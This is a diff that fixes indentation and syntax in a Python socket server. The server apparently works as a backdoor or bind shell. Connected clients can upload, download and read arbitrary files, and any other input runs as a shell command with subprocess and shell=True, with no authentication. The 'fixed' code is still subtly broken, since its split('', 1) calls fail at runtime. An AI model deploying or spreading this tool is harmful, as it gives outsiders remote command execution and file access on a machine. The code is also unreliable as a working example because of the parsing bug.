@@ -29,89 +29,89 @@ def start_server():
         print(f"[+]Connection established with {client_address}\n")
 
         while True:
-         try:
-            # Receive data from client
-            data = client_socket.recv(4096)
-            if not data:
-                print("[-] Client disconnected.")
-                break
+            try:
+                # Receive data from client
+                data = client_socket.recv(4096)
+                if not data:
+                    print("[-] Client disconnected.")
+                    break
                 
-            command = data.decode('utf-8').strip()
-            if command.lower() == "exit":
-                print("[+] Client requested disconnection.")
-                break
+                command = data.decode('utf-8').strip()
+                if command.lower() == "exit":
+                    print("[+] Client requested disconnection.")
+                    break
 
-            print(f"[>] Command received: {command}")
+                print(f"[>] Command received: {command}")
 
-            # ---------COMMAND HANDLER --------
-            if command startswith("upload"):
-                filename = command.split("", 1)[1]
-                client_socket.send(b"[READY]")
+                #  --------COMMAND HANDLER --------
+                if command.startswith("upload"):
+                    filename = command.split("", 1)[1]
+                    client_socket.send(b"[READY]")
 
-                # Receive file size
-                file_size = int(client_socket.recv(1024).decode())
-                client_socket.send(b"[SIZE OK]")
+                    # Receive file size
+                    file_size = int(client_socket.recv(1024).decode())
+                    client_socket.send(b"[SIZE OK]")
 
-                # Receive file data
-                with open(filename, "wb") as f:
-                  bytes_read = 0
-                  while bytes_read < file_size:
-                    chunk = client_socket.recv(4096)
-                    if not chunk:
-                        break
-                    f.write(chunk)
-                    bytes_read += len(chunk)
-                client_socket.send(f"[+] File '{filename}' uploaded successfully.\n".encode())
+                    # Receive file data
+                    with open(filename, "wb") as f:
+                        bytes_read = 0
+                        while bytes_read < file_size:
+                            chunk = client_socket.recv(4096)
+                            if not chunk:
+                                break
+                            f.write(chunk)
+                            bytes_read += len(chunk)
+                    client_socket.send(f"[+] File '{filename}' uploaded successfully.\n".encode())
 
-              elif command.startswith("download"):
-                 filename = command.split("", 1)[1]
-                 if os.path.exists(filename):
-                    file_size = os.path.getsize(filename)
-                    client_socket.send(str(file_size).encode())
-                    ack = client_socket.recv(1024)
+                elif command.startswith("download"):
+                    filename = command.split("", 1)[1]
+                    if os.path.exists(filename):
+                        file_size = os.path.getsize(filename)
+                        client_socket.send(str(file_size).encode())
+                        ack = client_socket.recv(1024)
 
-                    with open(filename, "rb") as f:
-                      while chunk := f.read(4096):
-                        client_socket.send(chunk)
-                    client_socket.send(b"[Done]")
+                        with open(filename, "rb") as f:
+                            while chunk := f.read(4096):
+                                client_socket.send(chunk)
+                        client_socket.send(b"[Done]")
+                    else:
+                        client_socket.send(b"[-]File not found.\n")
+
+                elif command.startswith("view"):
+                    filename = command.split("",1)[1]
+                    if os.path.exists(filename):
+                        with open(filename, "r", encoding="utf-8",errors="ignore") as f:
+                            contents = f.read()
+                        client_socket.send(contents.encode())
+                    else:
+                        client_socket.send(b"[-]File not found.\n")
+
                 else:
-                  client_socket.send(b"[-]File not found.\n")
+                    # Default: execute system command
+                    try:
+                         result = subprocess.check_output(command,shell=True,stderr=subprocess.STDOUT)
+                    except subprocess.CalledProcessError as e:
+                        result = f"Unexpected error: {e}\n".encode()
 
-              elif command.startswith("view"):
-                 filename = command.split("",1)[1]
-                 if os.path.exists(filename):
-                    with open(filename, "r", encoding="utf-8",errors="ignore")ad f:
-                      contents = f.read()
-                    client_socket.send(contents.encode())
-                else:
-                  client_socket.send(b"[-]File not found.\n")
+                    client_socket.send(result)
 
-             else:
-                # Default: execute system command
-                try:
-                   result = subprocess.check_output(command,shell=True,stderr=subprocess.STDOUT)
-                except subprocess.CalledProcessError as e:
-                  result = f"Unexpected error: {e}\n".encode()
+            except KeyboardInterrupt:
+                 print("\n[*] Server shutdown requested.")
+                 break
+            except Exception as e:
+                 print(f"[-] Error:{e}")
+                 break
 
-                client_socket.send(result)
+        client_socket.close()
 
-             except KeyboardInterrupt:
-               print("\n[*] Server shutdown requested.")
-               break
-             except Exception as e:
-               print(f"[-] Error:{e}")
-               break
+    except socket.error as e:
+        print(f"Socket error: {e}")
+    finally:
+        server_socket.close()
+        print("[*] Server closed.")
 
-          client_socket.close()
-
-       except socket.error as e:
-         print(f"Socket error: {e}")
-       finally:
-          server_socket.close()
-          print("[*] Server closed.")
-
-     if_name_ == "_main_":
-       start_server()
+if __name__ == "__main__":
+    start_server()
 
                         
                     
